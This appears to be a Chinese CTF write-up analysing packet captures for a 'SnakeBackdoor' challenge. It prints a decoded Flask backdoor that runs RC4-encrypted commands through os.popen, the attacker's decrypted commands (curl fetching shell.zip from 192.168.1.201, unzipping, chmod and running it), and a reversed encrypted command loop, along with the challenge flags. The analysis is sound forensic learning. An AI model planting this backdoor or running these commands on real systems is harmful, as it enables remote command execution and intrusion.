流量分析
SnakeBackdoor-1
过滤http.request.method == "POST"
![[Pasted image 20260128164926.png]]


flag{zxcvbnm123}

SnakeBackdoor-2
过滤分组详情 字符串 SECRET_KEY
![[Pasted image 20260128183636.png]]
flag{c6242af0-6891-4510-8432-e1cdf051f160}

SnakeBackdoor-3
http.request.method == "POST" && (http contains "import" || http contains "key" || http contains "exec")
![[Pasted image 20260128185904.png]]

然后进行base64解码
![[Pasted image 20260128185927.png]]
把这个=c4继续反转，zlib解码发现还是类似格式。所以编写循环，大概运行了三十多层才解出最后的源码。
```python
import base64
import zlib
import re
import os

# ===================== 核心配置 =====================
# 初始加密字节串
INITIAL_BYTES = b'=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'

# 最大循环次数（防止死循环，可根据需要调整）
MAX_LOOP = 100
# 保存中间结果的目录
OUTPUT_DIR = "nested_decrypt_results"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ===================== 核心函数 =====================
def decrypt_data(encrypted_bytes):
    """
    解密逻辑：反转 → Base64解码 → zlib解压
    :param encrypted_bytes: 待解密的字节串
    :return: 解密后的字符串，解密失败返回None
    """
    try:
        # 1. 反转字节串（去掉开头多余的=）
        reversed_data = encrypted_bytes[::-1]
        # 2. Base64解码
        b64_decoded = base64.b64decode(reversed_data, validate=True)
        # 3. zlib解压（优先常规解压，失败则跳过头部校验）
        try:
            decompressed = zlib.decompress(b64_decoded)
        except zlib.error:
            decompressed = zlib.decompress(b64_decoded, wbits=-15)
        # 4. 转字符串（忽略编码错误）
        decrypted_str = decompressed.decode('utf-8', errors='ignore')
        return decrypted_str
    except Exception as e:
        print(f"解密失败：{e}")
        return None

def extract_nested_bytes(decrypted_str):
    """
    从解密后的字符串中提取 exec((_)(b'xxx')) 里的字节串内容
    :param decrypted_str: 解密后的字符串
    :return: 提取到的字节串（bytes），无则返回None
    """
    # 正则匹配：exec((_)(b'...')) 中的 b'...' 部分
    # 正则说明：匹配 b' 开头，' 结尾，中间匹配任意字符（包括换行）
    pattern = re.compile(r'exec\(\(_\)\(b\'(.*?)\'\)\)', re.DOTALL)
    matches = pattern.findall(decrypted_str)
    if matches:
        # 取最后一个匹配（通常只有一个），转字节串
        nested_str = matches[-1]
        # 处理转义字符（如 \'、\\ 等）
        nested_bytes = bytes(nested_str, encoding='raw_unicode_escape')
        print(f"提取到嵌套字节串（长度：{len(nested_bytes)}）")
        return nested_bytes
    else:
        print("未提取到嵌套字节串，拆解完成")
        return None

# ===================== 主循环逻辑 =====================
if __name__ == "__main__":
    current_bytes = INITIAL_BYTES
    loop_count = 0
    
    print("="*80)
    print("开始循环拆解嵌套加密...")
    print(f"初始字节串长度：{len(current_bytes)}")
    print("="*80)
    
    while loop_count < MAX_LOOP:
        loop_count += 1
        print(f"\n【第 {loop_count} 轮拆解】")
        
        # 1. 解密当前字节串
        decrypted = decrypt_data(current_bytes)
        if not decrypted:
            print(f"第 {loop_count} 轮解密失败，终止循环")
            break
        
        # 2. 保存当前轮解密结果
        output_file = os.path.join(OUTPUT_DIR, f"round_{loop_count}_decoded.txt")
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(decrypted)
        print(f"第 {loop_count} 轮解密结果已保存到：{output_file}")
        
        # 3. 输出解密结果的前500字符（方便查看）
        print(f"第 {loop_count} 轮解密结果（前500字符）：")
        print(decrypted[:500].replace('\n', ' '))
        
        # 4. 提取嵌套字节串
        current_bytes = extract_nested_bytes(decrypted)
        if not current_bytes:
            # 无嵌套字节串，保存最终结果
            final_file = os.path.join(OUTPUT_DIR, "final_decoded_code.txt")
            with open(final_file, "w", encoding="utf-8") as f:
                f.write(decrypted)
            print(f"\n✅ 最终拆解完成！最终代码已保存到：{final_file}")
            break
    
    # 循环达到最大次数
    if loop_count >= MAX_LOOP:
        print(f"\n⚠️  已达到最大循环次数（{MAX_LOOP}轮），终止拆解")
        final_file = os.path.join(OUTPUT_DIR, "final_decoded_code.txt")
        with open(final_file, "w", encoding="utf-8") as f:
            f.write(decrypted)
        print(f"最后一轮解密结果已保存到：{final_file}")
```

恶意代码为
```python
global exc_class
global code
import os,binascii
exc_class, code = app._get_exc_class_and_code(404)
RC4_SECRET = b'v1p3r_5tr1k3_k3y'
def rc4_crypt(data: bytes, key: bytes) -> bytes:
	S = list(range(256))
	j = 0
	for i in range(256):
		j = (j + S[i] + key[i % len(key)]) % 256
		S[i], S[j] = S[j], S[i]
	i = j = 0
	res = bytearray()
	for char in data:
		i = (i + 1) % 256
		j = (j + S[i]) % 256
		S[i], S[j] = S[j], S[i]
		res.append(char ^ S[(S[i] + S[j]) % 256])
	return bytes(res)
def backdoor_handler():
	if request.headers.get('X-Token-Auth') != '3011aa21232beb7504432bfa90d32779':
		return "Error"
	enc_hex_cmd = request.form.get('data')
	if not enc_hex_cmd:
		return ""
	try:
		enc_cmd = binascii.unhexlify(enc_hex_cmd)
		cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore')
		output_bytes = getattr(os, 'popen')(cmd).read().encode('utf-8', errors='ignore')
		enc_output = rc4_crypt(output_bytes, RC4_SECRET)
		return binascii.hexlify(enc_output).decode()
	except:
		return "Error"
app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()
```
答案为flag{v1p3r_5tr1k3_k3y}


SnakeBackdoor-4

我们查找3011aa21232beb7504432bfa90d32779
![[Pasted image 20260128200310.png]]


29336:data =a6bc;解密结果为 id


29414 data=a3ab330fb285;解密结果ls -al

30525data=acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534解密结果curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip
30822 data=bab6694ba3c938e64b8d257b7cccee460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a结果unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip

30944 data=a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351;解密结果为b'mv /tmp/shell /tmp/python3.13'
31113 data=acb07e4db7c93ece4bcc37246687ae0649614caa3430ce4b chmod +x /tmp/python3.13

31190data=e0ac7e52fc996cc2038c2d7a3899ed解密结果 (Text): b'/tmp/python3.13'

所以flag{python3.13}


SnakeBackdoor-5
用上题找到的密码解压后得到shell，拖入ida逆向
![[Pasted image 20260128204919.png]]
我们过滤ip.src == 192.168.1.201 && tcp.port == 58782

主要逻辑
![[Pasted image 20260128205136.png]]

![[Pasted image 20260128205236.png]]
主循环
```c
while ( (unsigned int)recv_0((unsigned int)fd, &v6, 4, 0) == 4 )
  {// 循环接收4字节的「命令长度」，接收失败则退出
  // 步骤5.1：将网络大端序的命令长度转为主机小端序
    v6 = (v6 >> 8) & 0xFF00 | (v6 << 8) & 0xFF0000 | (v6 << 24) | HIBYTE(v6);
    // 步骤5.2：校验命令长度的合法性（加解密字节对齐要求）
    if ( v6 <= 0x1000 && v6 && (v6 & 0xF) == 0 )
    {// 步骤5.3：接收加密的命令数据，长度为v6，接收失败则跳出循环
      v21 = recv_0((unsigned int)fd, command, v6, 0);
      if ( v21 != v6 )
        break;
        // 步骤5.4：解密命令——调用sub_1860，用v10密钥解密command中的加密数据
      sub_1860(v10, 0, command, command, v21);
      
      // 步骤5.5：去除PKCS7填充（加解密的标准操作
      v17 = (unsigned __int8)command[v21 - 1];
      if ( v17 && v17 <= 16 )
        command[v21 - v17] = 0;
      else
        command[v21] = 0;
        
    // 步骤5.6：执行系统命令，读取执行结果
      stream = popen(command, "r");
      if ( stream )
      {
        v21 = fread(command, 1u, 0xFFFu, stream);
        pclose(stream);
        command[v21] = 0;
      }
      else
      {
        strcpy(command, "popen failed\n");
        v21 = strlen(command);
      }
      
      // 步骤5.7：对执行结果做PKCS7填充（满足16字节块对齐，为加密做准备）
      v15 = v21;
      v14 = 16 * (v21 / 16 + 1);
      v13 = v14 - v21;
      for ( j = v21; j < v14; command[j++] = v13 )
        ;
        
    // 步骤5.8：加密执行结果——调用sub_1860，用v9密钥加密command中的结果
      sub_1860(v9, 1, command, command, v14);
      
    // 步骤5.9：将填充后的结果长度做字节序转换，发送给远程控制端
      v5 = (v14 >> 8) & 0xFF00 | (v14 << 8) & 0xFF0000 | (v14 << 24) | (v14 >> 24);
      // 步骤5.10：发送加密后的执行结果，发送失败则跳出循环
      if ( (unsigned int)send_0((unsigned int)fd, &v5, 4, 0) != 4 )
        break;
      v3 = send_0((unsigned int)fd, command, v14, 0);
      if ( v14 != v3 )
        break;
    }
  }
  close(fd);
```

找到第一个数据包data=34952046
模拟脚本
```python
import ctypes
import struct

# Seed (Hex string from user: 34952046)
# Assuming this is Big-Endian hex representation from network packet
# 0x34952046
seed_hex = "34952046" 
seed = int(seed_hex, 16)

# Load libc
# Note: In standard CTF challenges with ELF binaries, 'rand()' usually follows GLIBC LCG or similar.
# GLIBC rand() is complex. 
# However, many "simple" windows/linux malware samples use standard LCG.
# If it's a Linux ELF (implied by previous "shell" name), it uses glibc rand().
# Python's random is NOT compatible.
# We must use ctypes to call the system's rand().

try:
    libc = ctypes.CDLL("libc.so.6")
except:
    # Fallback for non-Linux env (e.g. running on Windows locally), 
    # but the environment here is Linux.
    libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")

# Set seed
libc.srand(seed)

# Generate 4 random integers (16 bytes key)
key_bytes = b""
for _ in range(4):
    r = libc.rand()
    # Pack as little-endian (standard for x86 memory layout of int array)
    key_bytes += struct.pack("<I", r)

print(f"Flag (Little-Endian pack): flag{{{key_bytes.hex()}}}")

# Also try Big-Endian just in case
key_bytes_be = b""
libc.srand(seed) # Reset seed
for _ in range(4):
    r = libc.rand()
    key_bytes_be += struct.pack(">I", r)

print(f"Flag (Big-Endian pack):    flag{{{key_bytes_be.hex()}}}")
```
flag{ac46fb610b313b4f32fc642d8834b456}